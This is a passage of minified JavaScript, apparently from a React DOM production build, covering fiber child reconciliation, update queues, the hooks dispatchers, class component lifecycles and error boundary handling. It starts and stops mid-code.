b=f(a,m,y.value,c);if(null===b){null===m&&(m=v);break}e&&m&&null===b.alternate&&t(a,m),i=o(b,i,g),null===d?u=b:d.sibling=b,d=b,m=v}if(y.done)return n(a,m),as&&Xa(a,g),u;if(null===m){for(;!y.done;g++,y=l.next())null!==(y=h(a,y.value,c))&&(i=o(y,i,g),null===d?u=y:d.sibling=y,d=y);return as&&Xa(a,g),u}for(m=r(a,m);!y.done;g++,y=l.next())null!==(y=p(m,a,g,y.value,c))&&(e&&null!==y.alternate&&m.delete(null===y.key?g:y.key),i=o(y,i,g),null===d?u=y:d.sibling=y,d=y);return e&&m.forEach(function(e){return t(a,e)}),as&&Xa(a,g),u}return function e(r,s,o,l){if("object"===typeof o&&null!==o&&o.type===x&&null===o.key&&(o=o.props.children),"object"===typeof o&&null!==o){switch(o.$$typeof){case _:e:{for(var c=o.key,u=s;null!==u;){if(u.key===c){if((c=o.type)===x){if(7===u.tag){n(r,u.sibling),(s=a(u,o.props.children)).return=r,r=s;break e}}else if(u.elementType===c||"object"===typeof c&&null!==c&&c.$$typeof===O&&ys(c)===u.type){n(r,u.sibling),(s=a(u,o.props)).ref=gs(r,u,o),s.return=r,r=s;break e}n(r,u);break}t(r,u),u=u.sibling}o.type===x?((s=Ic(o.props.children,r.mode,l,o.key)).return=r,r=s):((l=Ac(o.type,o.key,o.props,null,r.mode,l)).ref=gs(r,s,o),l.return=r,r=l)}return i(r);case k:e:{for(u=o.key;null!==s;){if(s.key===u){if(4===s.tag&&s.stateNode.containerInfo===o.containerInfo&&s.stateNode.implementation===o.implementation){n(r,s.sibling),(s=a(s,o.children||[])).return=r,r=s;break e}n(r,s);break}t(r,s),s=s.sibling}(s=Uc(o,r.mode,l)).return=r,r=s}return i(r);case O:return e(r,s,(u=o._init)(o._payload),l)}if(te(o))return m(r,s,o,l);if(L(o))return g(r,s,o,l);vs(r,o)}return"string"===typeof o&&""!==o||"number"===typeof o?(o=""+o,null!==s&&6===s.tag?(n(r,s.sibling),(s=a(s,o)).return=r,r=s):(n(r,s),(s=Dc(o,r.mode,l)).return=r,r=s),i(r)):n(r,s)}}var ws=bs(!0),_s=bs(!1),ks=Sa(null),xs=null,Ss=null,Es=null;function js(){Es=Ss=xs=null}function Ts(e){var t=ks.current;Ea(ks),e._currentValue=t}function Cs(e,t,n){for(;null!==e;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,null!==r&&(r.childLanes|=t)):null!==r&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function Ns(e,t){xs=e,Es=Ss=null,null!==(e=e.dependencies)&&null!==e.firstContext&&(0!==(e.lanes&t)&&(bi=!0),e.firstContext=null)}function Rs(e){var t=e._currentValue;if(Es!==e)if(e={context:e,memoizedValue:t,next:null},null===Ss){if(null===xs)throw Error(s(308));Ss=e,xs.dependencies={lanes:0,firstContext:e}}else Ss=Ss.next=e;return t}var Ps=null;function Os(e){null===Ps?Ps=[e]:Ps.push(e)}function As(e,t,n,r){var a=t.interleaved;return null===a?(n.next=n,Os(t)):(n.next=a.next,a.next=n),t.interleaved=n,Is(e,r)}function Is(e,t){e.lanes|=t;var n=e.alternate;for(null!==n&&(n.lanes|=t),n=e,e=e.return;null!==e;)e.childLanes|=t,null!==(n=e.alternate)&&(n.childLanes|=t),n=e,e=e.return;return 3===n.tag?n.stateNode:null}var Ls=!1;function Ds(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Us(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Ms(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function zs(e,t,n){var r=e.updateQueue;if(null===r)return null;if(r=r.shared,0!==(2&Tl)){var a=r.pending;return null===a?t.next=t:(t.next=a.next,a.next=t),r.pending=t,Is(e,n)}return null===(a=r.interleaved)?(t.next=t,Os(r)):(t.next=a.next,a.next=t),r.interleaved=t,Is(e,n)}function Bs(e,t,n){if(null!==(t=t.updateQueue)&&(t=t.shared,0!==(4194240&n))){var r=t.lanes;n|=r&=e.pendingLanes,t.lanes=n,yt(e,n)}}function Fs(e,t){var n=e.updateQueue,r=e.alternate;if(null!==r&&n===(r=r.updateQueue)){var a=null,s=null;if(null!==(n=n.firstBaseUpdate)){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};null===s?a=s=o:s=s.next=o,n=n.next}while(null!==n);null===s?a=s=t:s=s.next=t}else a=s=t;return n={baseState:r.baseState,firstBaseUpdate:a,lastBaseUpdate:s,shared:r.shared,effects:r.effects},void(e.updateQueue=n)}null===(e=n.lastBaseUpdate)?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function Vs(e,t,n,r){var a=e.updateQueue;Ls=!1;var s=a.firstBaseUpdate,o=a.lastBaseUpdate,i=a.shared.pending;if(null!==i){a.shared.pending=null;var l=i,c=l.next;l.next=null,null===o?s=c:o.next=c,o=l;var u=e.alternate;null!==u&&((i=(u=u.updateQueue).lastBaseUpdate)!==o&&(null===i?u.firstBaseUpdate=c:i.next=c,u.lastBaseUpdate=l))}if(null!==s){var d=a.baseState;for(o=0,u=c=l=null,i=s;;){var h=i.lane,f=i.eventTime;if((r&h)===h){null!==u&&(u=u.next={eventTime:f,lane:0,tag:i.tag,payload:i.payload,callback:i.callback,next:null});e:{var p=e,m=i;switch(h=t,f=n,m.tag){case 1:if("function"===typeof(p=m.payload)){d=p.call(f,d,h);break e}d=p;break e;case 3:p.flags=-65537&p.flags|128;case 0:if(null===(h="function"===typeof(p=m.payload)?p.call(f,d,h):p)||void 0===h)break e;d=U({},d,h);break e;case 2:Ls=!0}}null!==i.callback&&0!==i.lane&&(e.flags|=64,null===(h=a.effects)?a.effects=[i]:h.push(i))}else f={eventTime:f,lane:h,tag:i.tag,payload:i.payload,callback:i.callback,next:null},null===u?(c=u=f,l=d):u=u.next=f,o|=h;if(null===(i=i.next)){if(null===(i=a.shared.pending))break;i=(h=i).next,h.next=null,a.lastBaseUpdate=h,a.shared.pending=null}}if(null===u&&(l=d),a.baseState=l,a.firstBaseUpdate=c,a.lastBaseUpdate=u,null!==(t=a.shared.interleaved)){a=t;do{o|=a.lane,a=a.next}while(a!==t)}else null===s&&(a.shared.lanes=0);Ll|=o,e.lanes=o,e.memoizedState=d}}function qs(e,t,n){if(e=t.effects,t.effects=null,null!==e)for(t=0;t<e.length;t++){var r=e[t],a=r.callback;if(null!==a){if(r.callback=null,r=n,"function"!==typeof a)throw Error(s(191,a));a.call(r)}}}var Ws={},Hs=Sa(Ws),Ks=Sa(Ws),Gs=Sa(Ws);function Js(e){if(e===Ws)throw Error(s(174));return e}function $s(e,t){switch(ja(Gs,t),ja(Ks,e),ja(Hs,Ws),e=t.nodeType){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:le(null,"");break;default:t=le(t=(e=8===e?t.parentNode:t).namespaceURI||null,e=e.tagName)}Ea(Hs),ja(Hs,t)}function Qs(){Ea(Hs),Ea(Ks),Ea(Gs)}function Ys(e){Js(Gs.current);var t=Js(Hs.current),n=le(t,e.type);t!==n&&(ja(Ks,e),ja(Hs,n))}function Xs(e){Ks.current===e&&(Ea(Hs),Ea(Ks))}var Zs=Sa(0);function eo(e){for(var t=e;null!==t;){if(13===t.tag){var n=t.memoizedState;if(null!==n&&(null===(n=n.dehydrated)||"$?"===n.data||"$!"===n.data))return t}else if(19===t.tag&&void 0!==t.memoizedProps.revealOrder){if(0!==(128&t.flags))return t}else if(null!==t.child){t.child.return=t,t=t.child;continue}if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var to=[];function no(){for(var e=0;e<to.length;e++)to[e]._workInProgressVersionPrimary=null;to.length=0}var ro=w.ReactCurrentDispatcher,ao=w.ReactCurrentBatchConfig,so=0,oo=null,io=null,lo=null,co=!1,uo=!1,ho=0,fo=0;function po(){throw Error(s(321))}function mo(e,t){if(null===t)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!ir(e[n],t[n]))return!1;return!0}function go(e,t,n,r,a,o){if(so=o,oo=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,ro.current=null===e||null===e.memoizedState?Zo:ei,e=n(r,a),uo){o=0;do{if(uo=!1,ho=0,25<=o)throw Error(s(301));o+=1,lo=io=null,t.updateQueue=null,ro.current=ti,e=n(r,a)}while(uo)}if(ro.current=Xo,t=null!==io&&null!==io.next,so=0,lo=io=oo=null,co=!1,t)throw Error(s(300));return e}function vo(){var e=0!==ho;return ho=0,e}function yo(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return null===lo?oo.memoizedState=lo=e:lo=lo.next=e,lo}function bo(){if(null===io){var e=oo.alternate;e=null!==e?e.memoizedState:null}else e=io.next;var t=null===lo?oo.memoizedState:lo.next;if(null!==t)lo=t,io=e;else{if(null===e)throw Error(s(310));e={memoizedState:(io=e).memoizedState,baseState:io.baseState,baseQueue:io.baseQueue,queue:io.queue,next:null},null===lo?oo.memoizedState=lo=e:lo=lo.next=e}return lo}function wo(e,t){return"function"===typeof t?t(e):t}function _o(e){var t=bo(),n=t.queue;if(null===n)throw Error(s(311));n.lastRenderedReducer=e;var r=io,a=r.baseQueue,o=n.pending;if(null!==o){if(null!==a){var i=a.next;a.next=o.next,o.next=i}r.baseQueue=a=o,n.pending=null}if(null!==a){o=a.next,r=r.baseState;var l=i=null,c=null,u=o;do{var d=u.lane;if((so&d)===d)null!==c&&(c=c.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),r=u.hasEagerState?u.eagerState:e(r,u.action);else{var h={lane:d,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};null===c?(l=c=h,i=r):c=c.next=h,oo.lanes|=d,Ll|=d}u=u.next}while(null!==u&&u!==o);null===c?i=r:c.next=l,ir(r,t.memoizedState)||(bi=!0),t.memoizedState=r,t.baseState=i,t.baseQueue=c,n.lastRenderedState=r}if(null!==(e=n.interleaved)){a=e;do{o=a.lane,oo.lanes|=o,Ll|=o,a=a.next}while(a!==e)}else null===a&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function ko(e){var t=bo(),n=t.queue;if(null===n)throw Error(s(311));n.lastRenderedReducer=e;var r=n.dispatch,a=n.pending,o=t.memoizedState;if(null!==a){n.pending=null;var i=a=a.next;do{o=e(o,i.action),i=i.next}while(i!==a);ir(o,t.memoizedState)||(bi=!0),t.memoizedState=o,null===t.baseQueue&&(t.baseState=o),n.lastRenderedState=o}return[o,r]}function xo(){}function So(e,t){var n=oo,r=bo(),a=t(),o=!ir(r.memoizedState,a);if(o&&(r.memoizedState=a,bi=!0),r=r.queue,Do(To.bind(null,n,r,e),[e]),r.getSnapshot!==t||o||null!==lo&&1&lo.memoizedState.tag){if(n.flags|=2048,Po(9,jo.bind(null,n,r,a,t),void 0,null),null===Cl)throw Error(s(349));0!==(30&so)||Eo(n,t,a)}return a}function Eo(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},null===(t=oo.updateQueue)?(t={lastEffect:null,stores:null},oo.updateQueue=t,t.stores=[e]):null===(n=t.stores)?t.stores=[e]:n.push(e)}function jo(e,t,n,r){t.value=n,t.getSnapshot=r,Co(t)&&No(e)}function To(e,t,n){return n(function(){Co(t)&&No(e)})}function Co(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!ir(e,n)}catch(r){return!0}}function No(e){var t=Is(e,1);null!==t&&tc(t,e,1,-1)}function Ro(e){var t=yo();return"function"===typeof e&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:wo,lastRenderedState:e},t.queue=e,e=e.dispatch=Jo.bind(null,oo,e),[t.memoizedState,e]}function Po(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},null===(t=oo.updateQueue)?(t={lastEffect:null,stores:null},oo.updateQueue=t,t.lastEffect=e.next=e):null===(n=t.lastEffect)?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e),e}function Oo(){return bo().memoizedState}function Ao(e,t,n,r){var a=yo();oo.flags|=e,a.memoizedState=Po(1|t,n,void 0,void 0===r?null:r)}function Io(e,t,n,r){var a=bo();r=void 0===r?null:r;var s=void 0;if(null!==io){var o=io.memoizedState;if(s=o.destroy,null!==r&&mo(r,o.deps))return void(a.memoizedState=Po(t,n,s,r))}oo.flags|=e,a.memoizedState=Po(1|t,n,s,r)}function Lo(e,t){return Ao(8390656,8,e,t)}function Do(e,t){return Io(2048,8,e,t)}function Uo(e,t){return Io(4,2,e,t)}function Mo(e,t){return Io(4,4,e,t)}function zo(e,t){return"function"===typeof t?(e=e(),t(e),function(){t(null)}):null!==t&&void 0!==t?(e=e(),t.current=e,function(){t.current=null}):void 0}function Bo(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,Io(4,4,zo.bind(null,t,e),n)}function Fo(){}function Vo(e,t){var n=bo();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&mo(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function qo(e,t){var n=bo();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&mo(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function Wo(e,t,n){return 0===(21&so)?(e.baseState&&(e.baseState=!1,bi=!0),e.memoizedState=n):(ir(n,t)||(n=mt(),oo.lanes|=n,Ll|=n,e.baseState=!0),t)}function Ho(e,t){var n=bt;bt=0!==n&&4>n?n:4,e(!0);var r=ao.transition;ao.transition={};try{e(!1),t()}finally{bt=n,ao.transition=r}}function Ko(){return bo().memoizedState}function Go(e,t,n){var r=ec(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},$o(e))Qo(t,n);else if(null!==(n=As(e,t,n,r))){tc(n,e,r,Zl()),Yo(n,t,r)}}function Jo(e,t,n){var r=ec(e),a={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if($o(e))Qo(t,a);else{var s=e.alternate;if(0===e.lanes&&(null===s||0===s.lanes)&&null!==(s=t.lastRenderedReducer))try{var o=t.lastRenderedState,i=s(o,n);if(a.hasEagerState=!0,a.eagerState=i,ir(i,o)){var l=t.interleaved;return null===l?(a.next=a,Os(t)):(a.next=l.next,l.next=a),void(t.interleaved=a)}}catch(c){}null!==(n=As(e,t,a,r))&&(tc(n,e,r,a=Zl()),Yo(n,t,r))}}function $o(e){var t=e.alternate;return e===oo||null!==t&&t===oo}function Qo(e,t){uo=co=!0;var n=e.pending;null===n?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function Yo(e,t,n){if(0!==(4194240&n)){var r=t.lanes;n|=r&=e.pendingLanes,t.lanes=n,yt(e,n)}}var Xo={readContext:Rs,useCallback:po,useContext:po,useEffect:po,useImperativeHandle:po,useInsertionEffect:po,useLayoutEffect:po,useMemo:po,useReducer:po,useRef:po,useState:po,useDebugValue:po,useDeferredValue:po,useTransition:po,useMutableSource:po,useSyncExternalStore:po,useId:po,unstable_isNewReconciler:!1},Zo={readContext:Rs,useCallback:function(e,t){return yo().memoizedState=[e,void 0===t?null:t],e},useContext:Rs,useEffect:Lo,useImperativeHandle:function(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,Ao(4194308,4,zo.bind(null,t,e),n)},useLayoutEffect:function(e,t){return Ao(4194308,4,e,t)},useInsertionEffect:function(e,t){return Ao(4,2,e,t)},useMemo:function(e,t){var n=yo();return t=void 0===t?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=yo();return t=void 0!==n?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=Go.bind(null,oo,e),[r.memoizedState,e]},useRef:function(e){return e={current:e},yo().memoizedState=e},useState:Ro,useDebugValue:Fo,useDeferredValue:function(e){return yo().memoizedState=e},useTransition:function(){var e=Ro(!1),t=e[0];return e=Ho.bind(null,e[1]),yo().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=oo,a=yo();if(as){if(void 0===n)throw Error(s(407));n=n()}else{if(n=t(),null===Cl)throw Error(s(349));0!==(30&so)||Eo(r,t,n)}a.memoizedState=n;var o={value:n,getSnapshot:t};return a.queue=o,Lo(To.bind(null,r,o,e),[e]),r.flags|=2048,Po(9,jo.bind(null,r,o,n,t),void 0,null),n},useId:function(){var e=yo(),t=Cl.identifierPrefix;if(as){var n=Ya;t=":"+t+"R"+(n=(Qa&~(1<<32-ot(Qa)-1)).toString(32)+n),0<(n=ho++)&&(t+="H"+n.toString(32)),t+=":"}else t=":"+t+"r"+(n=fo++).toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},ei={readContext:Rs,useCallback:Vo,useContext:Rs,useEffect:Do,useImperativeHandle:Bo,useInsertionEffect:Uo,useLayoutEffect:Mo,useMemo:qo,useReducer:_o,useRef:Oo,useState:function(){return _o(wo)},useDebugValue:Fo,useDeferredValue:function(e){return Wo(bo(),io.memoizedState,e)},useTransition:function(){return[_o(wo)[0],bo().memoizedState]},useMutableSource:xo,useSyncExternalStore:So,useId:Ko,unstable_isNewReconciler:!1},ti={readContext:Rs,useCallback:Vo,useContext:Rs,useEffect:Do,useImperativeHandle:Bo,useInsertionEffect:Uo,useLayoutEffect:Mo,useMemo:qo,useReducer:ko,useRef:Oo,useState:function(){return ko(wo)},useDebugValue:Fo,useDeferredValue:function(e){var t=bo();return null===io?t.memoizedState=e:Wo(t,io.memoizedState,e)},useTransition:function(){return[ko(wo)[0],bo().memoizedState]},useMutableSource:xo,useSyncExternalStore:So,useId:Ko,unstable_isNewReconciler:!1};function ni(e,t){if(e&&e.defaultProps){for(var n in t=U({},t),e=e.defaultProps)void 0===t[n]&&(t[n]=e[n]);return t}return t}function ri(e,t,n,r){n=null===(n=n(r,t=e.memoizedState))||void 0===n?t:U({},t,n),e.memoizedState=n,0===e.lanes&&(e.updateQueue.baseState=n)}var ai={isMounted:function(e){return!!(e=e._reactInternals)&&Ve(e)===e},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=Zl(),a=ec(e),s=Ms(r,a);s.payload=t,void 0!==n&&null!==n&&(s.callback=n),null!==(t=zs(e,s,a))&&(tc(t,e,a,r),Bs(t,e,a))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=Zl(),a=ec(e),s=Ms(r,a);s.tag=1,s.payload=t,void 0!==n&&null!==n&&(s.callback=n),null!==(t=zs(e,s,a))&&(tc(t,e,a,r),Bs(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=Zl(),r=ec(e),a=Ms(n,r);a.tag=2,void 0!==t&&null!==t&&(a.callback=t),null!==(t=zs(e,a,r))&&(tc(t,e,r,n),Bs(t,e,r))}};function si(e,t,n,r,a,s,o){return"function"===typeof(e=e.stateNode).shouldComponentUpdate?e.shouldComponentUpdate(r,s,o):!t.prototype||!t.prototype.isPureReactComponent||(!lr(n,r)||!lr(a,s))}function oi(e,t,n){var r=!1,a=Ta,s=t.contextType;return"object"===typeof s&&null!==s?s=Rs(s):(a=Oa(t)?Ra:Ca.current,s=(r=null!==(r=t.contextTypes)&&void 0!==r)?Pa(e,a):Ta),t=new t(n,s),e.memoizedState=null!==t.state&&void 0!==t.state?t.state:null,t.updater=ai,e.stateNode=t,t._reactInternals=e,r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=a,e.__reactInternalMemoizedMaskedChildContext=s),t}function ii(e,t,n,r){e=t.state,"function"===typeof t.componentWillReceiveProps&&t.componentWillReceiveProps(n,r),"function"===typeof t.UNSAFE_componentWillReceiveProps&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&ai.enqueueReplaceState(t,t.state,null)}function li(e,t,n,r){var a=e.stateNode;a.props=n,a.state=e.memoizedState,a.refs={},Ds(e);var s=t.contextType;"object"===typeof s&&null!==s?a.context=Rs(s):(s=Oa(t)?Ra:Ca.current,a.context=Pa(e,s)),a.state=e.memoizedState,"function"===typeof(s=t.getDerivedStateFromProps)&&(ri(e,t,s,n),a.state=e.memoizedState),"function"===typeof t.getDerivedStateFromProps||"function"===typeof a.getSnapshotBeforeUpdate||"function"!==typeof a.UNSAFE_componentWillMount&&"function"!==typeof a.componentWillMount||(t=a.state,"function"===typeof a.componentWillMount&&a.componentWillMount(),"function"===typeof a.UNSAFE_componentWillMount&&a.UNSAFE_componentWillMount(),t!==a.state&&ai.enqueueReplaceState(a,a.state,null),Vs(e,n,a,r),a.state=e.memoizedState),"function"===typeof a.componentDidMount&&(e.flags|=4194308)}function ci(e,t){try{var n="",r=t;do{n+=F(r),r=r.return}while(r);var a=n}catch(s){a="\nError generating stack: "+s.message+"\n"+s.stack}return{value:e,source:t,stack:a,digest:null}}function ui(e,t,n){return{value:e,source:null,stack:null!=n?n:null,digest:null!=t?t:null}}function di(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var hi="function"===typeof WeakMap?WeakMap:Map;function fi(e,t,n){(n=Ms(-1,n)).tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){ql||(ql=!0,Wl=r),di(0,t)},n}function pi(e,t,n){(n=Ms(-1,n)).tag=3;var r=e.type.getDerivedStateFromError;if("function"===typeof r){var a=t.value;n.payload=function(){return r(a)},n.callback=function(){di(0,t)}}var s=e.stateNode;return null!==s&&"function"===typeof s.componentDidCatch&&(n.callback=function(){di(0,t),"function"!==typeof r&&(null===Hl?Hl=new Set([this]):Hl.add(this));var e=t.stack;this.componentDidCatch(t.value,{componentStack:null!==e?e:""})}),n}function mi(e,t,n){var r=e.pingCache;if(null===r){r=e.pingCache=new hi;var a=new Set;r.set(t,a)}else void 0===(a=r.get(t))&&(a=new Set,r.set(t,a));a.has(n)||(a.add(n),e=Sc.bind(null,e,t,n),t.then(e,e))}function gi(e){do{var t;if((t=13===e.tag)&&(t=null===(t=e.memoizedState)||null!==t.dehydrated),t)return e;e=e.return}while(null!==e);return null}function vi(e,t,n,r,a){return 0===(1&e.mode)?(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,1===n.tag&&(null===n.alternate?n.tag=17:((t=Ms(-1,1)).tag=2,zs(n,t,1))),n.lanes|=1),e):(e.flags|=65536,e.lanes=a,e)}var yi=w.ReactCurrentOwner,bi=!1;function wi(e,t,n,r){t.child=null===e?_s(t,null,n,r):ws(t,e.child,n,r)}function _i(e,t,n,r,a){n=n.render;var s=t.ref;return Ns(t,a),r=go(e,t,n,r,s,a),n=vo(),null===e||bi?(as&&n&&es(t),t.flags|=1,wi(e,t,r,a),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,qi(e,t,a))}function ki(e,t,n,r,a){if(null===e){var s=n.type;return"function"!==typeof s||Pc(s)||void 0!==s.defaultProps||null!==n.compare||void 0!==n.defaultProps?((e=Ac(n.type,null,r,t,t.mode,a)).ref=t.ref,e.return=t,t.child=e):(t.tag=15,t.type=s,xi(e,t,s,r,a))}if(s=e.child,0===(e.lanes&a)){var o=s.memoizedProps;if((n=null!==(n=n.compare)?n:lr)(o,r)&&e.ref===t.ref)return qi(e,t,a)}return t.flags|=1,(e=Oc(s,r)).ref=t.ref,e.return=t,t.child=e}function xi(e,t,n,r,a){if(null!==e){var s=e.memoizedProps;if(lr(s,r)&&e.ref===t.ref){if(bi=!1,t.pendingProps=r=s,0===(e.lanes&a))return t.lanes=e.lanes,qi(e,t,a);0!==(131072&e.flags)&&(bi=!0)}}return ji(e,t,n,r,a)}function Si(e,t,n){var r=t.pendingProps,a=r.children,s=null!==e?e.memoizedState:null;if("hidden"===r.mode)if(0===(1&t.mode))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},ja(Ol,Pl),Pl|=n;else{if(0===(1073741824&n))return e=null!==s?s.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,ja(Ol,Pl),Pl|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=null!==s?s.baseLanes:n,ja(Ol,Pl),Pl|=r}else null!==s?(r=s.baseLanes|n,t.memoizedState=null):r=n,ja(Ol,Pl),Pl|=r;return wi(e,t,a,n),t.child}function Ei(e,t){var n=t.ref;(null===e&&null!==n||null!==e&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function ji(e,t,n,r,a){var s=Oa(n)?Ra:Ca.current;return s=Pa(t,s),Ns(t,a),n=go(e,t,n,r,s,a),r=vo(),null===e||bi?(as&&r&&es(t),t.flags|=1,wi(e,t,n,a),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,qi(e,t,a))}function Ti(e,t,n,r,a){if(Oa(n)){var s=!0;Da(t)}else s=!1;if(Ns(t,a),null===t.stateNode)Vi(e,t),oi(t,n,r),li(t,n,r,a),r=!0;else if(null===e){var o=t.stateNode,i=t.memoizedProps;o.props=i;var l=o.context,c=n.contextType;"object"===typeof c&&null!==c?c=Rs(c):c=Pa(t,c=Oa(n)?Ra:Ca.current);var u=n.getDerivedStateFromProps,d="function"===typeof u||"function"===typeof o.getSnapshotBeforeUpdate;d||"function"!==typeof o.UNSAFE_componentWillReceiveProps&&"function"!==typeof o.componentWillReceiveProps||(i!==r||l!==c)&&ii(t,o,r,c),Ls=!1;var h=t.memoizedState;o.state=h,Vs(t,r,o,a),l=t.memoizedState,i!==r||h!==l||Na.current||Ls?("function"===typeof u&&(ri(t,n,u,r),l=t.memoizedState),(i=Ls||si(t,n,i,r,h,l,c))?(d||"function"!==typeof o.UNSAFE_componentWillMount&&"function"!==typeof o.componentWillMount||("function"===typeof o.componentWillMount&&o.componentWillMount(),"function"===typeof o.UNSAFE_componentWillMount&&o.UNSAFE_componentWillMount()),"function"===typeof o.componentDidMount&&(t.flags|=4194308)):("function"===typeof o.componentDidMount&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=l),o.props=r,o.state=l,o.context=c,r=i):("function"===typeof o.componentDidMount&&(t.flags|=4194308),r=!1)}else{o=t.stateNode,Us(e,t),i=t.memoizedProps,c=t.type===t.elementType?i:ni(t.type,i),o.props=c,d=t.pendingProps,h=o.context,"object"===typeof(l=n.contextType)&&null!==l?l=Rs(l):l=Pa(t,l=Oa(n)?Ra:Ca.current);var f=n.getDerivedStateFromProps;(u="function"===typeof f||"function"===typeof o.getSnapshotBeforeUpdate)||"function"!==typeof o.UNSAFE_componentWillReceiveProps&&"function"!==typeof o.componentWillReceiveProps||(i!==d||h!==l)&&ii(t,o,r,l),Ls=!1,h=t.memoizedState,o.state=h,Vs(t,r,o,a);var p=t.memoizedState;i!==d||h!==p||Na.current||Ls?("function"===typeof f&&(ri(t,n,f,r),p=t.memoizedState),(c=Ls||si(t,n,c,r,h,p,l)||!1)?(u||"function"!==typeof o.UNSAFE_componentWillUpdate&&"function"!==typeof o.componentWillUpdate||("function"===typeof o.componentWillUpdate&&o.componentWillUpdate(r,p,l),"function"===typeof o.UNSAFE_componentWillUpdate&&o.UNSAFE_componentWillUpdate(r,p,l)),"function"===typeof o.componentDidUpdate&&(t.flags|=4),"function"===typeof o.getSnapshotBeforeUpdate&&(t.flags|=1024)):("function"!==typeof o.componentDidUpdate||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),"function"!==typeof o.getSnapshotBeforeUpdate||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=p),o.props=r,o.state=p,o.context=l,r=c):("function"!==typeof o.componentDidUpdate||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),"function"!==typeof o.getSnapshotBeforeUpdate||i===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),r=!1)}return Ci(e,t,n,r,s,a)}function Ci(e,t,n,r,a,s){Ei(e,t);var o=0!==(128&t.flags);if(!r&&!o)return a&&Ua(t,n,!1),qi(e,t,s);r=t.stateNode,yi.current=t;var i=o&&"function"!==typeof n.getDerivedStateFromError?null:r.render();return t.flags|=1,null!==e&&o?(t.child=ws(t,e.child,null,s),t.child=ws(t,null,i,s)):wi(e,t,i,s),t.memoizedState=r.state,a&&Ua(t,n,!0),t.child}function Ni(e){var t=e.stateNode;t.pendingContext?Ia(0,t.pendingContext,t.pendingContext!==t.context):t.context&&Ia(0,t.context,!1),$s(e,t.containerInfo)}function Ri(e,t,n,r,a){return fs(),ps(a),t.flags|=256,wi(e,t,n,r),t.child}var Pi,Oi,Ai,Ii={dehydrated:null,treeContext:null,retryLane:0};function Li(e){return{baseLanes:e,cachePool:null,transitions:null}}function Di(e,t,n){var r,a=t.pendingProps,o=Zs.current,i=!1,l=0!==(128&t.flags);if((r=l)||(r=(null===e||null!==e.memoizedState)&&0!==(2&o)),r?(i=!0,t.flags&=-129):null!==e&&null===e.memoizedState||(o|=1),ja(Zs,1&o),null===e)return 